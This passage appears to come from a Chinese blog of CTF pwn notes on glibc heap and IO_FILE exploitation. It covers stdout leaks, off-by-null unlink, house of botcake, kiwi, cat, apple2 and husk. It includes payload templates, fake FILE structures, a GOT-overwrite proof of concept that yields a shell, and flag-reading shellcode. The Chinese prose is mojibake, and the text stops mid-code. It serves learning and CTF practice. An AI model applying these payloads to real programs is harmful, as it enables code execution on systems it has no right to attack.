title="åˆ©ç”¨_IO_2_1_stdout_æ³„éœ²åœ°å€"></a>åˆ©ç”¨_IO_2_1_stdout_æ³„éœ²åœ°å€</h3><p>é€šå¸¸å°†<code>_flags</code>è®¾ç½®ä¸º<code>0xfbad1800</code> è®¾ç½®<code>_IO_write_base</code>æŒ‡å‘æƒ³è¦æ³„éœ²çš„åœ°æ–¹ <code>_IO_write_ptr</code>æŒ‡å‘æ³„éœ²ç»“æŸçš„åœ°å€<br>ä¹‹åé‡åˆ°<code>puts</code>æˆ–<code>printf</code> å°±ä¼šå°†<code>_IO_write_base</code>æŒ‡å‘çš„å†…å®¹æ‰“å°å‡ºæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">&#x27;\x00&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="é€šè¿‡off-by-nullè¿›è¡Œunlink"><a href="#é€šè¿‡off-by-nullè¿›è¡Œunlink" class="headerlink" title="é€šè¿‡off_by_nullè¿›è¡Œunlink"></a>é€šè¿‡off_by_nullè¿›è¡Œunlink</h3><p>æ³¨æ„ï¼šé€šå¸¸ç¬¬ä¸€ä¸ªè¢«é‡Šæ”¾çš„<code>chunk</code>ä¸ä¼šè¢«è¿›è¡Œåˆå¹¶<br>æŸæ¬¡åšé¢˜æ—¶è¿›è¡Œçš„æ“ä½œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ptr = heap_base+<span class="number">0x2c0</span>  <span class="comment"># ptræŒ‡å‘ç¬¬ä¸€ä¸ªchunkçš„fdæŒ‡é’ˆçš„ä½ç½®(chunk 0)</span></span><br><span class="line">log.success(<span class="string">f&quot;ptr: <span class="subst">&#123;ptr:#x&#125;</span>&quot;</span>)</span><br><span class="line">add(<span class="number">0x408</span>,p64(heap_base + <span class="number">0x7b0</span>)+<span class="string">b&quot;a&quot;</span>*<span class="number">0x3ff</span>+<span class="string">b&#x27;\n&#x27;</span>) <span class="comment"># 0  å‰é¢çš„åœ°å€æŒ‡å‘ä¼ªé€ çš„fake chunkçš„åœ°å€ å³ä¸‹é¢çš„edit(1)</span></span><br><span class="line">log.success(<span class="string">f&quot;heap_base + 0x7b0: <span class="subst">&#123;heap_base + <span class="number">0x7b0</span>:#x&#125;</span>&quot;</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x4f8</span>+<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x408</span>,<span class="string">&quot;c&quot;</span>*<span class="number">0x407</span>+<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x4f8</span>,<span class="string">&quot;d&quot;</span>*<span class="number">0x4f7</span>+<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x408</span>,<span class="string">&quot;e&quot;</span>*<span class="number">0x407</span>+<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&quot;c&quot;</span>*<span class="number">0x400</span> + p64(<span class="number">0x410</span>*<span class="number">2</span>))</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">0xe0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x410</span>*<span class="number">2</span>+<span class="number">1</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>))  <span class="comment"># åœ¨chunk1ä¸­ä¼ªé€ ä¸€ä¸ªfake chunk0x820</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>chunk1çš„ä¸­é—´éƒ¨åˆ†+chunk2+chunk3è¿›è¡Œåˆå¹¶</p><h3 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h3><p>é€šå¸¸åœ¨å­˜åœ¨<code>UAF</code>æ¼æ´ï¼Œä½†åªèƒ½å¯¹å…¶è¿›è¡Œ<code>delete</code>æ“ä½œæ—¶ä½¿ç”¨<br>åˆ©ç”¨æ­¥éª¤<br>1ã€å…ˆå°†<code>tcache bin</code>å¡«æ»¡ï¼ˆå¤§å°è¦å¤§äº<code>0x80</code>ï¼‰<br>2ã€å†è¿ç»­<code>free</code>ä¸¤ä¸ªè¿ç€çš„å †å—ï¼ˆ<code>A</code>åœ¨<code>B</code>çš„ä¸Šæ–¹ï¼Œ<code>A</code>ä¸èƒ½è¿›å…¥<code>tcache bin</code> ä¸” <code>B</code>çš„å¤§å°è¦ä¸ç¬¬ä¸€æ­¥<code>tcache bin</code>ä¸­çš„ç›¸ç­‰ï¼‰ï¼Œä½¿å…¶åˆå¹¶åè¿›å…¥<code>unsorted bin</code><br>3ã€ä»<code>tcache bin</code>ä¸­å–å‡ºä¸€ä¸ªå †å—ï¼Œç©ºå‡ºä¸€ä¸ªä½ç½®<br>4ã€å°†<code>Chunk B</code>åˆ©ç”¨<code>UAF</code>æ¼æ´ï¼Œå†æ¬¡é‡Šæ”¾åˆ°<code>tcache bin</code>ä¸­ï¼Œå¹¶ç”³è¯·å›<code>unsorted bin</code>ä¸­çš„<code>Chunk A &amp; B</code>åˆå¹¶çš„å¤§å †å—ï¼ˆéƒ¨åˆ†ï¼‰ï¼Œä¿®æ”¹<code>Chunk B</code>çš„<code>next</code>æŒ‡é’ˆæŒ‡å‘ä»»æ„åœ°å€ï¼Œå¹¶ç”³è¯·åˆ°ä»»æ„åœ°å€çš„æ§åˆ¶æƒ</p><h3 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi(&lt;&#x3D; 2.36)"></a>house of kiwi(&lt;&#x3D; 2.36)</h3><ul><li>å°†<code>_IO_file_jumps</code>ä¸­çš„<code>_IO_new_file_sync</code>ä¿®æ”¹ä¸º<code>setcontext + 61</code> æ³¨æ„ï¼šè¯¥<code>_IO_file_jumps</code>ä½äº<code>stderr</code>ä¸­</li><li>å…¶ä¸­<code>rdx</code>æŒ‡å‘<code>_IO_helper_jumps_addr</code>ï¼Œ<code>rdi</code>æŒ‡å‘<code>_IO_2_1_stderr_addr</code></li><li>å¯ä»¥é€šè¿‡åœ¨<code>_IO_helper_jumps_addr + 0xA0</code>çš„ä½ç½®å†™å…¥<code>rop</code>é“¾ä¹Ÿå¯ä»¥é€šè¿‡åœ¨<code>libc</code>ä¸­æ‰¾<code>gadget</code>å°†<code>rdi</code>è½¬ç§»åˆ°<code>rbx</code>ä¸­</li><li>é€šè¿‡<code>__malloc_assert</code>è§¦å‘è¯¥æ”»å‡»</li></ul><h3 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h3><ul><li>ä¾æ—§ä¸ºå°†<code>stderr</code>æ‰€æŒ‡å‘çš„åŒºåŸŸä¼ªé€ ä¸€ä¸ª<code>fake_io_file</code></li><li>åˆ©ç”¨æ¨¡æ¿</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr = heapbase+<span class="number">0xb00</span> <span class="comment"># ä¼ªé€ çš„fake_IOç»“æ„ä½“çš„åœ°å€</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE = p64(rdi)         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0xb0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(call_addr)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addrA</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]+<span class="number">0x10</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br></pre></td></tr></table></figure><ul><li>sizeä¸º<code>0x118</code></li></ul><p>æ¨¡æ¿äºŒï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x30</span>: call,  <span class="comment"># ogg/setcontext</span></span><br><span class="line">    <span class="number">0x40</span>: rbx,   </span><br><span class="line">    <span class="number">0x78</span>: writeable,   </span><br><span class="line">    <span class="number">0x90</span>: fake_addr + <span class="number">0x30</span>, </span><br><span class="line">    <span class="number">0xc8</span>: IO_wfile_jumps + <span class="number">0x10</span>,  <span class="comment"># vtable</span></span><br><span class="line">    <span class="number">0xf8</span>: fake_add + <span class="number">0x28</span>,</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"><span class="comment"># ä¸åŒ…æ‹¬io_fileçš„å‰0x10å­—èŠ‚</span></span><br></pre></td></tr></table></figure><ul><li>æœ€ç»ˆé€šè¿‡<code>_malloc_assert</code>æ¥è§¦å‘æ”»å‡»<br>ä»<code>2.36</code>ç‰ˆæœ¬å¼€å§‹ï¼Œåˆ é™¤äº†<code>_malloc_assert</code>å¯¹<code>stderr</code>çš„åˆ·æ–°ï¼Œå› æ­¤é€šè¿‡è¯¥æ–¹æ³•è§¦å‘æ”»å‡»çš„æ‰‹æ®µç”Ÿæ•ˆï¼Œä½†å¯ä»¥ä½¿ç”¨<code>fsop</code>çš„æ–¹æ³•æ¥è§¦å‘æ”»å‡»(<code>FSOP</code>éœ€å°†<code>vtable</code>æ”¹ä¸º<code>IO_wfile_jumps+0x30</code>,å¹¶ä¸”è¦å°†<code>_IO_list_all</code>æŒ‡å‘å¯æ§çš„<code>fake_file</code>åœ°å€)</li></ul><h3 id="house-of-ç§¦æœˆæ±‰å…³"><a href="#house-of-ç§¦æœˆæ±‰å…³" class="headerlink" title="house of ç§¦æœˆæ±‰å…³"></a>house of ç§¦æœˆæ±‰å…³</h3><p>ä¿®æ”¹<code>libc</code>ä¸­çš„éƒ¨åˆ†<code>got.plt</code>èŠ‚æ¥æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„å‡½æ•°</p><h4 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h4><p>putså‡½æ•°è°ƒç”¨æ—¶ä¼šéšå¼çš„è°ƒç”¨<code>strlen</code>å‡½æ•°ï¼Œè€Œ<code>strlen</code>å‡½æ•°çš„<code>got.plt</code>èŠ‚åœ¨<code>libc</code>ä¸­ï¼Œå¦‚æœæˆ‘ä»¬å°†<code>strlen</code>çš„<code>got.plt</code>ä¸­çš„å†…å®¹æ”¹ä¸º<code>system</code>å‡½æ•°çš„åœ°å€ï¼Œé‚£ä¹ˆæ‰§è¡Œ<code>puts(&quot;/bin/sh&quot;)-&gt;strlen(&quot;/bin/sh&quot;)</code>å°±ä¼šå˜æˆ<code>puts(&quot;/bin/sh&quot;)-&gt;system(&quot;/bin/sh&quot;)</code>è¿›è€Œ<code>getshell</code><br>poc:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> puts_offset = <span class="number">0x80ed0</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> libc_base_addr = (<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)&amp;<span class="built_in">puts</span> - puts_offset;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> strlen_addr  = libc_base_addr + <span class="number">0x19d960</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> system_addr = libc_base_addr  + <span class="number">0x50d60</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *strlen_got_plt_addr= (<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)(libc_base_addr + <span class="number">0x219098</span> );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;è¾“å‡º/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    *strlen_got_plt_addr = system_addr;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;å–å¾—shell&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h3><p>ä¸»è¦æ˜¯å› ä¸ºç³»ç»Ÿæ²¡æœ‰å¯¹<code>wfile_vtable</code>ä¸­å‡½æ•°æŒ‡é’ˆçš„åˆæ³•æ€§è¿›è¡Œæ£€æµ‹ï¼Œå¯¼è‡´å¯ä»¥è®©æˆ‘ä»¬è¿›è¡Œåˆ©ç”¨<br>åˆ©ç”¨é“¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</span><br></pre></td></tr></table></figure><p>åœ¨<code>_IO_2_1_stderr_</code>çš„ä½ç½®ä¼ªé€ ä¸€ä¸ª<code>fake_file</code><br>Csomeç‰ˆ<code>fake_file</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="string">b&quot;  sh;&quot;</span>,</span><br><span class="line">    <span class="number">0x28</span>: system,</span><br><span class="line">    <span class="number">0x88</span>: libc_base+<span class="number">0x2008f0</span>,  <span class="comment">#lock writable addr</span></span><br><span class="line">    <span class="number">0xa0</span>: stderr-<span class="number">0x40</span>,   <span class="comment"># _wide_data</span></span><br><span class="line">    <span class="number">0xD8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>], <span class="comment"># jumptable</span></span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br></pre></td></tr></table></figure><p>é€šè¿‡<code>exit</code>æˆ–è€…ä¸»å‡½æ•°è¿”å›è§¦å‘è¯¥æ”»å‡»<br>æ”¹æ–¹æ³•ä¹Ÿå¯ä»¥ç”¨äºæ‰“<code>rop</code>ï¼Œå°†<code>0x28</code>å¤„è®¾ç½®ä¸º<code>magic gadget</code>çš„åœ°å€ï¼Œ<code>0x0</code>å¤„å¸ƒç½®å¥½å†…å®¹ç”¨äºå°†æŒ‡å®šçš„åœ°å€è®¾ç½®è¿›<code>rbx</code>ä¸­å¹¶ä½¿<code>rip</code>èƒ½å¤ŸæŒ‡å‘<code>setcontext+61</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># stderr-0x40+0x18 == 0 -&gt; FILE-&gt;_wide_data-&gt;_IO_wirite_base == 0  </span></span><br><span class="line"><span class="comment"># stderr-0x40+0x30 == 0 -&gt; FILE-&gt;_wide_data-&gt;_IO_buf_base == 0</span></span><br><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="number">0</span>,    <span class="comment"># flag &amp; 8 ==0 &amp;&amp; flag &amp; 0x800 == &amp;&amp; FILE-&gt;flags &amp; 2 ==0</span></span><br><span class="line">    <span class="number">0x8</span>: stderr-<span class="number">0x10</span>,    <span class="comment"># magic_gadget move rdx, [rdi+8]</span></span><br><span class="line">    <span class="number">0x10</span>: setcontext,    <span class="comment"># magic call qword ptr [rdx+0x20]</span></span><br><span class="line">    <span class="number">0x20</span>: <span class="number">0</span>,    <span class="comment"># FILE-&gt;_IO_write_ptr &gt; FILE-&gt;_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: magic_gadget,    <span class="comment"># (target code addr)fake _wide_vtable-&gt;_IO_wdoallocbuf</span></span><br><span class="line">    <span class="number">0x58</span>: stderr &amp; (~<span class="number">0xfff</span>),    <span class="comment"># set rdi</span></span><br><span class="line">    <span class="number">0x60</span>: <span class="number">0x1000</span>,    <span class="comment"># set rsi</span></span><br><span class="line">    <span class="number">0x78</span>: <span class="number">7</span>,    <span class="comment"># set rdx</span></span><br><span class="line">    <span class="number">0x90</span>: stderr+<span class="number">0xe0</span>,    <span class="comment"># set rsp</span></span><br><span class="line">    <span class="number">0x98</span>: mprotect,    <span class="comment"># set rcx (first jmp)</span></span><br><span class="line">    <span class="number">0xa0</span>: stderr-<span class="number">0x40</span>,    <span class="comment"># reuse _wide_data</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base+libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>], <span class="comment"># _IO_wfile_jumps</span></span><br><span class="line">    <span class="number">0xe0</span>: [    <span class="comment"># ROPstart</span></span><br><span class="line">        pop_rax_call_rax,</span><br><span class="line">        stderr+<span class="number">0xf0</span>,</span><br><span class="line">    ], </span><br><span class="line">    <span class="number">0xf0</span>: asm(    <span class="comment"># shellcode start</span></span><br><span class="line"><span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov edx,0x100</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall     </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">&#125;,filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="house-of-husk"><a href="#house-of-husk" class="headerlink" title="house of husk"></a>house of husk</h3><p>æ”¹æ–¹æ³•ä¸»è¦æ˜¯åˆ©ç”¨<code>printf</code>å‡½æ•°åœ¨è¿›è¡Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶ä¼šè°ƒç”¨<code>__printf_arginfo_table</code>å’Œ<code>__printf_function_table</code>ä¸­çš„å‡½æ•°æŒ‡é’ˆæ‰€æŒ‡å‘çš„å‡½æ•°ï¼Œæ­¤æ—¶æˆ‘æˆ‘ä»¬å¯ä»¥åŠ«æŒè¿™2ä¸ªæŒ‡é’ˆæ‰€ä»¥æŒ‡å‘çš„åœ°å€ï¼Œç„¶ååœ¨è¯¥åœ°å€ä¸­å†™å…¥<code>ogg</code>çš„åœ°å€ï¼Œåœ¨ä¸‹æ¬¡è°ƒç”¨<code>printf</code>å‡½æ•°æ—¶å³å¯<code>getshell</code><br>è¿™é‡Œè¦æ³¨æ„ï¼Œåœ¨è¿›è¡Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶æ“ä½œç³»ç»Ÿä¼šå¯¹è¿™ä¸¤ä¸ªæŒ‡é’ˆåˆ¤æ–­æ˜¯å¦ç©ºï¼Œå¦‚æœä¸ºç©ºåˆ™ä¼šè°ƒç”¨<code>calloc</code>æ¥åˆ†é…å†…å­˜æ¥ç»™è¿™ä¸¤ä¸ªè¡¨ï¼Œå…¶ä¸­æ¯ä¸€ä¸ªè¡¨çš„å¤§å°éƒ½ä¸º<code>0x100</code>.éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨æˆ‘ä»¬ä¼ªé€ çš„è¡¨ä¸­ï¼Œæ ¼å¼åŒ–å­—ç¬¦æ‰€å¯¹åº”çš„å‡½æ•°æŒ‡é’ˆè¦ä¹ˆæ˜¯<code>0</code>ï¼Œè¦ä¹ˆæ˜¯ä¸€ä¸ªåˆæ³•çš„åœ°å€<br>å‡è®¾ç°åœ¨<code>__printf_function_table</code>å’Œ<code>__printf_arginfo_table</code>åˆ†åˆ«è¢«å¡«ä¸Šäº†<code>chunk 4</code>ä¸<code>chunk 8</code>çš„å †å—åœ°å€ï¼ˆ<code>chunk header</code>ï¼‰<br>æ–¹æ³•ä¸€ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">one_gadget = libc.address + <span class="number">0xe6c7e</span></span><br><span class="line">edit(<span class="number">8</span>, p64(<span class="number">0</span>)*(<span class="built_in">ord</span>(<span class="string">&#x27;s&#x27;</span>) - <span class="number">2</span>) + p64(one_gadget))</span><br></pre></td></tr></table></figure><p>ç”±äºæœ‰å †å—å¤´ï¼Œæ‰€ä»¥æ ¼å¼åŒ–å­—ç¬¦çš„ç´¢å¼•è¦å‡<code>2</code>ï¼Œè¿™æ ·å†™å°±æ»¡è¶³äº†<code>__printf_function_table</code>ä¸ä¸ºç©ºï¼Œè¿›å…¥äº†<code>printf_positional</code>å‡½æ•°ï¼Œå¹¶è°ƒç”¨äº†<code>__printf_arginfo_table</code>ä¸­çš„å‡½æ•°æŒ‡é’ˆ<br>æ–¹æ³•äºŒï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">one_gadget = libc.address + <span class="number">0xe6ed8</span></span><br><span class="line">edit(<span class="number">4</span>, p64(<span class="number">0</span>)*(<span class="built_in">ord</span>(<span class="string">&#x27;s&#x27;</span>) - <span class="number">2</span>) + p64(one_gadget))</span><br></pre></td></tr></table></figure><p>__printf_arginfo_tableå’Œ__printf_function_tableçš„åœ°å€å¯ä»¥ç›´æ¥é€šè¿‡<code>p &amp;</code>æ¥æŸ¥æ‰¾<br>å¯ä»¥åˆ©ç”¨ä¸‹é¢è¿™ä¸ªå‡½æ•°æ¥æŸ¥æ‰¾ç›¸å…³åœ°å€ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Register FUNC to be called to format SPEC specifiers.  */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__register_printf_specifier (<span class="type">int</span> spec, printf_function converter,</span><br><span class="line">     printf_arginfo_size_function arginfo)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (spec &lt; <span class="number">0</span> || spec &gt; (<span class="type">int</span>) UCHAR_MAX)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  __libc_lock_lock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__printf_function_table == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_arginfo_table = (printf_arginfo_size_function **)</span><br><span class="line"><span class="built_in">calloc</span> (UCHAR_MAX + <span class="number">1</span>, <span class="keyword">sizeof</span> (<span class="type">void</span> *) * <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> (__printf_arginfo_table == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  result = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      __printf_function_table = (printf_function **)</span><br><span class="line">(__printf_arginfo_table + UCHAR_MAX + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __printf_function_table[spec] = converter;</span><br><span class="line">  __printf_arginfo_table[spec] = arginfo;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">  __libc_lock_unlock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡½æ•° <code>vfprintf</code> ä¸­çš„éƒ¨åˆ†æºç ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 